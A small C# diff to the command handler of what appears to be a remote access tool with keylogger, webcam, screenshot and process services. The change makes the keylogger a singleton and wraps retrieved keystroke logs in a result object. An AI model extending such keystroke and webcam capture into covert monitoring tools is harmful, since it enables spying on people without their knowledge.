@@ -21,7 +21,7 @@ public class CommandHandler
         _screenshotService = new ScreenshotService();
         _processService = new ProcessService();
         _systemInfoService = new SystemInfoService();
-        _keyLoggerService = new KeyLoggerService();
+        _keyLoggerService = KeyLoggerService.Instance;
         _webCamService = new WebCamService();
         _powerService = new PowerService();
     }
@@ -134,7 +134,8 @@ public class CommandHandler
     private CommandResult HandleGetKeylogData(CommandRequest request)
     {
         var logs = _keyLoggerService.GetLogs();
-        return CreateSuccessResult(request, "Keylog data retrieved", new { Logs = logs });
+        var keylogResult = new KeylogResult { Entries = logs };
+        return CreateSuccessResult(request, "Keylog data retrieved", keylogResult);
     }
 
     // ====== Webcam Handlers ======
